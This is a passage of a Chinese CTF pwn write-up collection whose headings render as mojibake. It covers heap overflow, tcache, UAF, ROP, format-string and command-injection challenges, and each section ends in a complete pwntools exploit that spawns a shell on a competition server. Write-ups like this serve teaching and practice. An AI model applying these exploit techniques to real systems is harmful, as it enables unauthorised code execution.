<h3 id="é¢˜ç›®åˆ†æ-v6"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v6">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>æ¼æ´ç‚¹åœ¨editå‡½æ•°,å­˜åœ¨æº¢å‡º</p>
<p><img src="http://static.zybuluo.com/hgggg/jq3bhsmvh7hzm8750ph2vjll/image_1fjpn0gt2s2a1aml2mo1pugvir9.png" alt="image_1fjpn0gt2s2a1aml2mo1pugvir9.png-59kB"></p>
<p>add å‡½æ•°é™åˆ¶äº†å †å—ç”³è¯·ä¸ªæ•°ä»¥åŠæœ€å¤§ç”³è¯·çš„å¤§å°</p>
<p><img src="http://static.zybuluo.com/hgggg/95dvpw16ig0zpq2f2lx4zv34/image_1fjpn1b1p8vn9fpgna1l1o6rm.png" alt="image_1fjpn1b1p8vn9fpgna1l1o6rm.png-78.9kB"></p>
<p>è§£é¢˜æ€è·¯æ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨chunk overlapping æ³„éœ²å‡ºlibc ç„¶åæ‰“free_hook</p>
<h3 id="è§£é¢˜æ­¥éª¤-v5"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v5">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1ï¼šå¡«æ»¡tcache,åˆ©ç”¨editä¸­çš„æº¢å‡ºä¿®æ”¹sizeåˆ¶é€ overlapped chunkï¼Œé‡Šæ”¾è¿›å…¥unsorted binå¾—åˆ°libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)  </span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xb8</span>) </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line"><span class="comment"># å› ä¸ºchunk0-6çš„sizeä½ä¸º0x101,æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹chunk8çš„sizeä½ä¸º0x101ï¼Œä½¿å¾—chunk8å’Œchunk9åˆå¹¶</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x01\x01&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># é‡Šæ”¾chunk8è¿›å…¥unsorted bin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># å°†åŸæœ¬çš„chunk8æ¢å¤ï¼Œæ­¤æ—¶chunk9çš„fdæŒ‡é’ˆæŒ‡å‘main_arena_xx</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: åŠ«æŒfree_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(system))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h3 id="å®Œæ•´exp-v2"><a class="header-anchor" href="#å®Œæ•´exp-v2">Â¶</a>å®Œæ•´exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;cpp1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28139</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)  </span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xb8</span>) </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x01\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(system))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ä¸œåæ¯-2021-bg3"><a class="header-anchor" href="#ä¸œåæ¯-2021-bg3">Â¶</a>[ä¸œåæ¯ 2021]bg3</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v11"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v11">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.ç¨‹åºé€»è¾‘æ¼æ´
2.tcache attack
</code></pre>
<h3 id="é¢˜ç›®åˆ†æ-v7"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v7">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>æ¼æ´ç‚¹åœ¨addå‡½æ•°ï¼Œå°±æ˜¯å…·æœ‰ç›¸åŒidxçš„chunkçš„sizeä¼šå åŠ ï¼Œç”±æ­¤é€ æˆæº¢å‡º<br>
<img src="http://static.zybuluo.com/hgggg/lebe8euhcwtj94oapwyj9t1v/image_1fjs35m2cq5l16sn120t1mthdvd9.png" alt="image_1fjs35m2cq5l16sn120t1mthdvd9.png-88.7kB"></p>
<h3 id="è§£é¢˜æ­¥éª¤-v6"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v6">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1:unsorted bin attack æ³„éœ²libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>) <span class="comment">#é˜²æ­¢åˆå¹¶</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: åˆ©ç”¨æº¢å‡ºæ¥ä¿®æ”¹tcache chunkçš„fdæŒ‡é’ˆï¼ŒåŠ«æŒfree_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))+p64(free_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v12"><a class="header-anchor" href="#exp-v12">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;bg3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28070</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Select:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Info:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)    </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ä¸œåæ¯-2021-boom-script"><a class="header-anchor" href="#ä¸œåæ¯-2021-boom-script">Â¶</a>[ä¸œåæ¯ 2021]boom_script</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v12"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v12">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.tcache attack
2.UAF
3.ç±»VMpwn
</code></pre>
<h3 id="é¢˜ç›®åˆ†æ-v8"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v8">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>è¿™é“é¢˜è·Ÿç€ç¾¤é‡Œå¤§ä½¬çš„wpåšçš„ï¼Œå†™çš„å¾ˆè¯¦ç»†<br>
<a href="http://static.zybuluo.com/hgggg/a99pzogyuu4bmnlx36jqxtlx/boom_script.md" target="_blank">boom_script</a></p>
<h3 id="exp-v13"><a class="header-anchor" href="#exp-v13">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;boom_script&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28182</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;$&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">var1 = &quot;&#123;0&#125;&quot;;\</span></span><br><span class="line"><span class="string">var2 = &quot;&#123;1&#125;&quot;;\</span></span><br><span class="line"><span class="string">var1 = &quot;&#123;2&#125;&quot;;\</span></span><br><span class="line"><span class="string">prints(&quot;aaaaaaaa&quot;);</span></span><br><span class="line"><span class="string">var2 = &quot;AAAAAAAA&quot;;</span></span><br><span class="line"><span class="string">array arr1[20];</span></span><br><span class="line"><span class="string">inputn(var3);</span></span><br><span class="line"><span class="string">arr1[-3] = var3;</span></span><br><span class="line"><span class="string">arr1[-35] = 844424930131968;</span></span><br><span class="line"><span class="string">var4 = &quot;&#123;1&#125;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">array arr2[1];</span></span><br><span class="line"><span class="string">inputn(var5);</span></span><br><span class="line"><span class="string">arr2[0] = var5;</span></span><br><span class="line"><span class="string">var6 = &quot;/bin/sh&quot;;</span></span><br><span class="line"><span class="string">var6 = &quot;AAAAAAAA&quot;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x458</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)+<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">p.send(<span class="built_in">str</span>(free_hook-<span class="number">0x28</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="built_in">str</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ncç­¾åˆ°"><a class="header-anchor" href="#ncç­¾åˆ°">Â¶</a>ncç­¾åˆ°</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v13"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v13">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<p>linux æ–‡ä»¶æ“ä½œ</p>
<h3 id="exp-v14"><a class="header-anchor" href="#exp-v14">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28082</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tac$IFS$9flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="gift-pwn"><a class="header-anchor" href="#gift-pwn">Â¶</a>gift_pwn</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v14"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v14">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<p>ret2text</p>
<h3 id="exp-v15"><a class="header-anchor" href="#exp-v15">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28077</span>)</span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4005ba</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(gift)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="whitegive-pwn"><a class="header-anchor" href="#whitegive-pwn">Â¶</a>whitegive_pwn</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v15"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v15">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>ret2text
</code></pre>
<h3 id="exp-v16"><a class="header-anchor" href="#exp-v16">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;white_give&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28052</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;white_give&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line">ret = <span class="number">0x0000000000400509</span></span><br><span class="line">binsh = <span class="number">0x000000000018ce57</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x4006da</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) +p64(ret)+ p64(pop_rdi) + p64(libc_base + binsh) + p64(system) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="NSS-printer-I"><a class="header-anchor" href="#NSS-printer-I">Â¶</a>NSS_printer_I</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v16"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v16">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>æ ¼å¼åŒ–å­—ç¬¦ä¸²
</code></pre>
<h3 id="exp-v17"><a class="header-anchor" href="#exp-v17">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;printer1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28014</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;printer1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%17$p%21$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = elf_base+elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-æ·±è‚²æ¯-find-flag"><a class="header-anchor" href="#2021-æ·±è‚²æ¯-find-flag">Â¶</a>[2021 æ·±è‚²æ¯]find_flag</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v17"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v17">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.æ ¼å¼åŒ–å­—ç¬¦ä¸²
2.æ ˆæº¢å‡º
</code></pre>
